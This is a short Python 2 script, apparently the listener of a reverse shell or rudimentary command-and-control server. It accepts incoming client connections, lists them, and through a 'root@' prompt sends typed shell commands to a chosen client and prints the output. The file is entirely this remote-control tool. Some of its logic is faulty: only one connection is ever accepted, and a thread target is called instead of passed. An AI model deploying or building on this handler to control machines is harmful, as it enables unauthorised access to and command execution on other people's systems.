#!/usr/bin/env python

import socket
import threading
import sys

class Server(object):

    def __init__(self):
        self.ip = "127.0.0.1"
        self.port = 10101
        self.socket = socket.socket()
        self.data_size = 4096
        self.addresses_to_connections = {}

    
    def start(self):
        self.configure_socket()
        self.send_commands()


    def configure_socket(self):
        self.socket.bind((self.ip, self.port))
        self.socket.listen(5)

    
    def send_commands(self):
        thread = threading.Thread(target=self.accept_connections)
        thread.daemon = True
        thread.start()
        thread = threading.Thread(target=self.accept_commands())
        thread.daemon = True
        thread.start()       


    def accept_connections(self):
        try: 
            connection, address = self.socket.accept()
            self.addresses_to_connections[address[0]] = connection            
        except socket.error:
            print(socket.error)
    

    def accept_commands(self):    
        while True:
            command = raw_input("root@" + self.ip + "$ ")
            if command == "show":
                self.show_connections()
            elif command[:6] == "manage":
                address = command[7:]
                self.manage_connection(address)
            elif command == "exit":
                self.close_connections()
                break
            elif command == "help":
                print("show             - show active connections")
                print("manage [address] - manage an active connection")
                print("exit             - exit an active connection")
            else:
                print("command not recognized")
    

    def show_connections(self):
        inactive_addresses = []
        for address, connection in self.addresses_to_connections.items():
            try:
                connection.send("?")
                connection.recv(self.data_size)
            except socket.error:
                inactive_addresses.append(address)
                continue
        for inactive_address in inactive_addresses:
            del self.addresses_to_connections[inactive_address]
        print("----------- Connections -----------")        
        if len(self.addresses_to_connections) == 0:
            print("\n           No Connections")
        for address in self.addresses_to_connections.keys():
            print("\n" + address)
        print("\n-----------------------------------")


    def manage_connection(self, address):
        if address is None:
            print("address not provided")
        if not address in self.addresses_to_connections:
            print("address not recognized")
        else:
            connection = self.addresses_to_connections[address]
            print("\nEnter 'exit' to leave the connection\n")
            while True:
                command = raw_input("root@" + address + "$ ")
                if command == "exit":
                    break
                elif len(command) > 0:
                    try:
                        connection.send(command)
                        response = str(connection.recv(4096))
                        print(response)
                    except socket.error:
                        print("lost connection")
                        break


    def close_connections(self):
        for connection in self.addresses_to_connections.values():
            connection.close()
        self.socket.close()


Server().start()

